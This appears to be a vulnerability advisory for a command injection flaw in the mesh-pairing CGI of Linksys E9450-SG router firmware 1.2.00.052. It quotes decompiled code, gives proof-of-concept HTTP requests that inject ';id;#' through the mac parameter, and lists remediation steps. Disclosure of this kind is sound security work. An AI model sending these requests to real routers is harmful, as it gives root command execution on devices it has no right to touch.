# Linksys E9450-SG 1.2.00.052 was discovered to contain a command injection vulnerability in mesh pairing

## Overview

- Vendor: Linksys
- Product: E9450-SG
- Version: 1.2.00.052
- Component: bin/httpd, mesh child-node pairing CGI
- Vulnerability Class: CWE-78 command injection
- CVSS 3.1 (tentative): 7.2 High `AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` (normal `do_cgi` pages require a session; if the `.cmd` pairing alias is reachable without one, the score is 9.8)
- Manufacturer: https://www.linksys.com/

## Affected version

- `FW_E9450-SG_1.2.00.052_prod.bin`.
- `rootfs/bin/httpd`.

## Vulnerability details

The mesh-pairing JavaScript calls:

```text
selectChildNodeForPairing.cmd?mac=<mac>
disAuthMacChildNode.cmd?mac=<mac>
```

`sub_38678` (`cgiSelectChildNodeForPairing`) and `sub_388B8`
(`cgiDisAuthMacChildNode`) read the `mac` value with
`sub_34AF8(a1, "mac", 0, buf, 19)` (`cgiGetValueByNameSafe`, length
limit 19) and build:

```c
sprintf(cmd,
    "/etc/gtk_script/gtk_new_mesh_pairing/authMac.sh %s &", mac);
rut_doSystemAction("Child node pairing - Polling ping", cmd);
```

and for dis-auth:

```c
sprintf(cmd,
    "/etc/gtk_script/gtk_new_mesh_pairing/disauthMac.sh %s &", mac);
rut_doSystemAction("DisAuth Mac", cmd);
```

`mac` is copied without quoting or character filtering; the helper's
length limit is 19 bytes, which is enough for a shell separator. With
`mac=%3Bid%3B%23` (URL-decoded to `;id;#`), the command becomes:

```sh
/etc/gtk_script/gtk_new_mesh_pairing/authMac.sh ;id;# &
```

The shell runs the missing script, then `id` (the `#` comments out the
trailing `&`). A local `/bin/sh` test of the exact command printed
`uid=...` from `id`.

The normal `do_cgi` path validates a session with `sub_200F4`
(`cgiValidateSessionKey`) before dispatching pages. Treat the endpoint
as authenticated unless the `.cmd` pairing alias is confirmed to bypass
that check; the POST/GET request should include the administrator
session cookie.

## PoC

```http
GET /selectChildNodeForPairing.cmd?mac=%3Bid%3B%23 HTTP/1.1
Host: <router>
Cookie: <valid administrator session>
```

Equivalent dis-auth request:

```http
GET /disAuthMacChildNode.cmd?mac=%3Bid%3B%23 HTTP/1.1
Host: <router>
Cookie: <valid administrator session>
```

The `id` output is written to the httpd/CGI output or log; a longer
payload can create a marker file if the 19-byte limit is respected.

## Verification

The vulnerable handler in the stock `bin/httpd, mesh child-node pairing CGI` was decompiled from the unpacked rootfs; the relevant code and offsets are quoted above. No dynamic run was completed.

## Impact

An authenticated administrator (or anyone with a stolen session) can
execute arbitrary commands as root through the mesh-pairing CGI. The
`mac` parameter is normally a MAC address, so a malicious value is easy
to supply; the 19-byte limit still permits `;id;#` and similar short
commands.

## Remediation / known-CVE relation

- Validate `mac` as a strict MAC address (`^[0-9A-Fa-f:]{17}$`) before
  building the command, or use an argv-based executor.
- Quote/escape the value and reject shell metacharacters even after MAC
  validation.
- NVD keyword searches for `Linksys E9450 authMac`,
  `cgiSelectChildNodeForPairing`, `disAuthMacChildNode` and
  `Linksys E9450 command injection` returned zero results on
  2026-11-08. Candidate 0-day; no CVE assigned and no vendor contact has
  been made.

## Additional Information

```markdown
### Vendor
Linksys

### Product
E9450-SG

### Version or Commit
1.2.00.052

### Vulnerability Class
CWE-78 command injection

### Description
The mesh-pairing CGI passes the mac parameter through cgiGetValueByNameSafe without filtering into authMac.sh %s and disauthMac.sh %s, which are executed by rut_doSystemAction.

### Affected_component
bin/httpd, mesh child-node pairing CGI

### Attack_vector
Authenticated mesh-pairing request with a crafted mac parameter.

### Product_version
E9450-SG 1.2.00.052

### Reference
- https://www.linksys.com/
- https://github.com/vuln-1/vuln/blob/main/Linksys/E9450_V1.2.00.052/report-1.md
```
